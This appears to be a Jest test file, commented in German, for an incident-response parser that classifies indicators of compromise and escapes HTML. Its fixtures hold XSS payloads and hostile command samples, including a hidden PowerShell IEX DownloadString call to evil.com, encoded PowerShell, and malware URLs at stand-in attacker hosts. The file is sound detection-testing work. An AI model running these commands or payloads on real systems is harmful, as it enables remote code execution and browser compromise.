'use strict';

const { detectAndParse, sanitize, escHtml,
        MAX_FIELD_LENGTH, MAX_TITLE_LENGTH, MAX_PAYLOAD_LENGTH } = require('./lib/parser');

// ═══════════════════════════════════════════════════════════
// S1 — SECURITY TESTS
// ═══════════════════════════════════════════════════════════

describe('S1 — escHtml', () => {
  const XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    "'><img src=x onerror=alert(document.cookie)>",
    '<iframe src="javascript:alert(1)">',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<body onload=alert(1)>',
  ];

  XSS_PAYLOADS.forEach(payload => {
    test(`escHtml neutralisiert Tags in: ${payload.substring(0, 40)}`, () => {
      const escaped = escHtml(payload);
      // Spitze Klammern müssen escaped sein — keine ausführbaren HTML-Tags
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('<img ');
      expect(escaped).not.toContain('<svg');
      expect(escaped).not.toContain('<iframe');
      expect(escaped).not.toContain('<body');
      // Payload mit < muss &lt; enthalten (außer javascript: URI die kein < hat)
      if (payload.includes('<')) {
        expect(escaped).toContain('&lt;');
      }
      // onerror=/onload= als TEXT ist ok — der Tag selbst ist neutralisiert
      // Kritisch: kein unescapter < vor dem Handler
      expect(escaped).not.toMatch(/<[a-z][^>]*on(error|load|click|mouseover)=/i);
    });
  });

  test('escHtml gibt leeren String für null zurück', () => {
    expect(escHtml(null)).toBe('');
    expect(escHtml(undefined)).toBe('');
    expect(escHtml('')).toBe('');
  });

  test('escHtml lässt normalen Text durch', () => {
    expect(escHtml('INC-2024-00123')).toBe('INC-2024-00123');
    expect(escHtml('192.168.241.100')).toBe('192.168.241.100');
  });

  test('escHtml escaped alle gefährlichen Zeichen', () => {
    expect(escHtml('<>&"\'')).toBe('&lt;&gt;&amp;&quot;&#x27;');
  });
});

describe('S1 — sanitize Input-Limits', () => {
  test('sanitize schneidet bei MAX_FIELD_LENGTH ab', () => {
    const long = 'A'.repeat(MAX_FIELD_LENGTH + 100);
    expect(sanitize(long).length).toBe(MAX_FIELD_LENGTH);
  });

  test('sanitize respektiert benutzerdefinierten maxLen', () => {
    expect(sanitize('Hallo Welt', 5)).toBe('Hallo');
  });

  test('sanitize gibt leeren String für null zurück', () => {
    expect(sanitize(null)).toBe('');
    expect(sanitize(undefined)).toBe('');
  });

  test('sanitize konvertiert Zahlen zu Strings', () => {
    expect(sanitize(12345)).toBe('12345');
  });

  test(`MAX_PAYLOAD_LENGTH ist ${MAX_PAYLOAD_LENGTH}`, () => {
    const bigPayload = 'X'.repeat(MAX_PAYLOAD_LENGTH + 1);
    expect(sanitize(bigPayload, MAX_PAYLOAD_LENGTH).length).toBe(MAX_PAYLOAD_LENGTH);
  });
});

// ═══════════════════════════════════════════════════════════
// SMART PARSER — Typ-Erkennung
// ═══════════════════════════════════════════════════════════

describe('detectAndParse — URL', () => {
  test('erkennt HTTP URL', () => {
    const r = detectAndParse('http://evil.example.com/payload.exe');
    expect(r.type).toBe('URL');
    expect(r.fields.url).toBe('http://evil.example.com/payload.exe');
  });

  test('erkennt HTTPS URL mit Query-Params', () => {
    const r = detectAndParse('https://cdn-update.fastnetwork.ru/stage2/loader.exe?id=9f3a');
    expect(r.type).toBe('URL');
    expect(r.fields.method).toBe('GET');
    expect(r.fields.notes).toContain('⚠️ Verdächtige Dateiendung: .exe');
  });

  test('erkennt FTP URL', () => {
    const r = detectAndParse('ftp://attacker.ru/malware.bin');
    expect(r.type).toBe('URL');
    expect(r.fields.method).toBe('FTP');
  });

  test('warnt bei verdächtigen Dateiendungen (.ps1, .dll, .hta)', () => {
    ['exe','dll','ps1','bat','vbs','hta'].forEach(ext => {
      const r = detectAndParse(`https://evil.com/file.${ext}`);
      expect(r.fields.notes).toContain(`⚠️ Verdächtige Dateiendung: .${ext}`);
    });
  });
});

describe('detectAndParse — IP', () => {
  test('erkennt öffentliche IPv4', () => {
    const r = detectAndParse('185.220.101.47');
    expect(r.type).toBe('IP');
    expect(r.fields.ip).toBe('185.220.101.47');
    expect(r.fields.notes).toContain('Öffentliche IP');
  });

  test('erkennt private 10.x.x.x', () => {
    const r = detectAndParse('10.0.0.5');
    expect(r.type).toBe('IP');
    expect(r.fields.notes).toContain('10.0.0.0/8');
  });

  test('erkennt private 192.168.x.x', () => {
    const r = detectAndParse('192.168.241.100');
    expect(r.fields.notes).toContain('192.168.240.0/16');
  });

  test('erkennt Loopback', () => {
    const r = detectAndParse('127.0.0.1');
    expect(r.fields.notes).toContain('Loopback');
  });

  test('erkennt IP mit Port', () => {
    const r = detectAndParse('185.220.101.47:4444');
    expect(r.type).toBe('IP');
    expect(r.fields.ip).toBe('185.220.101.47');
    expect(r.fields.notes).toContain('Port: 4444');
  });
});

describe('detectAndParse — Hash', () => {
  test('erkennt MD5 (32 Hex-Zeichen)', () => {
    const r = detectAndParse('d41d8cd98f00b204e9800998ecf8427e');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('MD5');
    expect(r.fields.vt).toContain('virustotal.com');
  });

  test('erkennt SHA1 (40 Hex-Zeichen)', () => {
    const r = detectAndParse('da39a3ee5e6b4b0d3255bfef95601890afd80709');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('SHA1');
  });

  test('erkennt SHA256 (64 Hex-Zeichen)', () => {
    const r = detectAndParse('a3f1c2d8e4b9074512fcd3a1e8b07245c9f3d1a8e7b204c5f9a3d2e1b8c07415');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('SHA256');
    expect(r.fields.hashval).toBe('a3f1c2d8e4b9074512fcd3a1e8b07245c9f3d1a8e7b204c5f9a3d2e1b8c07415');
  });

  test('Hash ist lowercase normalisiert', () => {
    const r = detectAndParse('D41D8CD98F00B204E9800998ECF8427E');
    expect(r.fields.hashval).toBe('d41d8cd98f00b204e9800998ecf8427e');
  });

  test('VT-Link wird generiert', () => {
    const hash = 'd41d8cd98f00b204e9800998ecf8427e';
    const r = detectAndParse(hash);
    expect(r.fields.vt).toBe(`https://www.virustotal.com/gui/file/${hash}`);
  });
});

describe('detectAndParse — Domain', () => {
  test('erkennt einfache Domain', () => {
    const r = detectAndParse('evil-domain.ru');
    expect(r.type).toBe('Domain');
    expect(r.fields.domain).toBe('evil-domain.ru');
  });

  test('warnt bei verdächtigen TLDs', () => {
    ['ru','cn','top','xyz','tk'].forEach(tld => {
      const r = detectAndParse(`malware.${tld}`);
      expect(r.type).toBe('Domain');
      expect(r.fields.notes).toContain(`⚠️ Verdächtige TLD: .${tld}`);
    });
  });

  test('keine Warnung bei harmlosen TLDs', () => {
    const r = detectAndParse('microsoft.com');
    expect(r.type).toBe('Domain');
    expect(r.fields.notes).not.toContain('⚠️');
  });

  test('erkennt Subdomain-Tiefe', () => {
    const r = detectAndParse('a.b.c.d.evil.com');
    expect(r.fields.notes).toContain('Subdomain-Tiefe');
  });
});

describe('detectAndParse — Registry-Key', () => {
  test('erkennt HKCU Run-Key (Persistence)', () => {
    const r = detectAndParse('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater');
    expect(r.type).toBe('Registry-Key');
    expect(r.fields.valname).toBe('updater');
    expect(r.fields.notes).toContain('⚠️ Bekannter Persistence-Pfad');
    expect(r.fields.notes).toContain('HKCU');
  });

  test('erkennt HKLM Run-Key', () => {
    const r = detectAndParse('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\evil');
    expect(r.type).toBe('Registry-Key');
    expect(r.fields.notes).toContain('HKLM');
  });

  test('erkennt HKCU Kurzschreibweise', () => {
    const r = detectAndParse('HKCU\\Software\\Malware\\key');
    expect(r.type).toBe('Registry-Key');
  });
});

describe('detectAndParse — File', () => {
  test('erkennt Windows-Pfad', () => {
    const r = detectAndParse('C:\\Users\\jdoe\\AppData\\Roaming\\svcupdate.ps1');
    expect(r.type).toBe('File');
    expect(r.fields.filename).toBe('svcupdate.ps1');
  });

  test('warnt bei ausführbaren Dateien', () => {
    const r = detectAndParse('C:\\Temp\\malware.exe');
    expect(r.fields.notes).toContain('⚠️ Ausführbare Datei: .exe');
  });

  test('warnt bei Temp/AppData Pfaden', () => {
    const r = detectAndParse('C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.ps1');
    expect(r.fields.notes).toContain('⚠️ Pfad in temporärem');
  });

  test('erkennt nur Dateiname ohne Pfad', () => {
    const r = detectAndParse('malware.exe');
    expect(r.type).toBe('File');
    expect(r.fields.filename).toBe('malware.exe');
  });
});

describe('detectAndParse — Command', () => {
  test('erkennt PowerShell mit -enc', () => {
    const r = detectAndParse('powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==');
    expect(r.type).toBe('Command');
    expect(r.fields.shell).toMatch(/powershell/i);
    expect(r.fields.notes).toContain('Verstecktes Fenster');
  });

  test('erkennt cmd.exe /c', () => {
    const r = detectAndParse('cmd.exe /c whoami && net user');
    expect(r.type).toBe('Command');
  });

  test('erkennt PowerShell DownloadString (Warnung)', () => {
    const r = detectAndParse('powershell -c (New-Object Net.WebClient).DownloadString("http://evil.com")');
    expect(r.type).toBe('Command');
    expect(r.fields.notes).toContain('⚠️ Download-Technik erkannt');
  });

  test('erkennt IEX (Warnung)', () => {
    const r = detectAndParse('powershell -c IEX (New-Object Net.WebClient).DownloadString("http://x.com")');
    expect(r.fields.notes).toContain('⚠️ IEX');
  });

  test('erkennt Pipe-Command', () => {
    const r = detectAndParse('net user | findstr admin');
    expect(r.type).toBe('Command');
  });
});

describe('detectAndParse — Email', () => {
  test('erkennt E-Mail Adresse', () => {
    const r = detectAndParse('phishing@fake-bank.de');
    expect(r.type).toBe('Email');
    expect(r.fields.sender).toBe('phishing@fake-bank.de');
  });

  test('warnt bei Typosquatting', () => {
    const r = detectAndParse('support@micros0ft.com');
    expect(r.fields.notes).toContain('⚠️ Mögliches Typosquatting');
  });
});

describe('detectAndParse — Encoded String', () => {
  test('erkennt Base64', () => {
    // "Hello World" in Base64
    const r = detectAndParse('SGVsbG8gV29ybGQ=');
    // Kurz genug wird evtl. nicht als Base64 erkannt (< 20 Zeichen)
    // Längerer Test:
    const long = btoa('A'.repeat(20));
    const r2 = detectAndParse(long);
    expect(r2.type).toBe('Encoded String');
    expect(r2.fields.encoding).toBe('Base64');
  });
});

describe('detectAndParse — User-Agent', () => {
  test('erkennt Mozilla User-Agent', () => {
    const r = detectAndParse('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    expect(r.type).toBe('User-Agent');
  });

  test('erkennt curl User-Agent', () => {
    const r = detectAndParse('curl/7.64.1');
    expect(r.type).toBe('User-Agent');
    expect(r.fields.tool).toBe('curl');
  });
});

describe('detectAndParse — Edge Cases', () => {
  test('leerer String gibt leeren Typ', () => {
    expect(detectAndParse('').type).toBe('');
    expect(detectAndParse('   ').type).toBe('');
  });

  test('unbekannter Input fällt auf Andere zurück', () => {
    const r = detectAndParse('das ist kein bekanntes Muster xyz123');
    expect(r.type).toBe('Andere');
    expect(r.fields.value).toBe('das ist kein bekanntes Muster xyz123');
  });

  test('URL wird nicht als Domain erkannt', () => {
    const r = detectAndParse('https://evil.com/path');
    expect(r.type).toBe('URL');
    expect(r.type).not.toBe('Domain');
  });

  test('IP wird nicht als Domain erkannt', () => {
    const r = detectAndParse('192.168.241.1');
    expect(r.type).toBe('IP');
  });

  test('Hash wird nicht als Andere erkannt', () => {
    const r = detectAndParse('d41d8cd98f00b204e9800998ecf8427e');
    expect(r.type).toBe('Hash');
    expect(r.type).not.toBe('Andere');
  });
});

// ═══════════════════════════════════════════════════════════
// XSS in Payload-Daten
// ═══════════════════════════════════════════════════════════

describe('XSS in Payload-Feldern', () => {
  const XSS = '<script>alert(1)</script>';

  test('XSS im URL-Feld wird als Text gespeichert, nicht ausgeführt', () => {
    const r = detectAndParse(`https://evil.com/${XSS}`);
    // Muss erkannt, aber der Wert darf kein ausführbares Script sein
    if (r.type === 'URL') {
      // Der Wert kann den Rohstring enthalten — das ist OK (nicht im DOM)
      expect(r.fields.url).toContain('<script>');
      // Aber escHtml muss das neutralisieren wenn es ins DOM geht
      const { escHtml: esc } = require('./lib/parser');
      expect(esc(r.fields.url)).not.toContain('<script>');
    }
  });

  test('XSS im Command-Feld wird als Text gespeichert', () => {
    const r = detectAndParse(`cmd.exe /c ${XSS}`);
    expect(r.type).toBe('Command');
    expect(r.fields.cmd).toContain('<script>');
    // Muss via escHtml neutralisiert werden
  });
});
